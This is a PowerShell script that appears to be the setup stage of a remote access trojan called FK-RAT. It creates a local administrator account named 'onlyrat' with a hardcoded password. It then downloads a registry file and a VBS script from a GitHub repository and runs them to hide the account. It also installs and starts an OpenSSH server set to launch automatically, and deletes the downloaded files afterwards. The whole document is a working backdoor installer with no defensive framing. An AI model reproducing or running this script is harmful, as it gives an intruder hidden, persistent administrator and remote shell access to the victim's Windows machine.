## Create random text (8 letters)
function randomText {
  return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
}

## Create Local Admin FUNCTION
function createAdmin {
  param (
    [string] $uName,
    [securestring] $pWord
  )
  begin{
  }
  process {
    New-LocalUser "$uName" -pWord $pWord  -FullName "$uName" -Description "Temporary local admin"
    Add-LocalGroupMember -Group "Administrators" -Member "$uName"
  }
  end{
  }
}

## Temp Directory
## variables
$temp = "$env:temp"
$dirName = randomText

$uName = "onlyrat"
$pWord = (ConvertTo-SecureString  "FindersKeepers" -AsPlainText -Force)

$regName = randomText
$vbsName = randomText

$location = Get-Location

## goto Temp and start 
Set-Location $temp	
New-Item -Path $temp -Name $dirName -Type Directory
Set-Location $dirName

## Create Admin
createAdmin -uName $uName -pWord $pWord

## Hide Admin with registry
# registry to hide admin
Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/admin.reg -OutFile "$regName.reg"

# vbs to register the registry
Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/confirm.vbs -OutFile "$vbsName.vbs"

# install the registry
Start-Process ./"$regName.reg";"$vbsName.vbs"

## Enable persistent SSH
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

## self delete
Remove-Item ./$regName.reg
Remove-Item ./$vbsName.vbs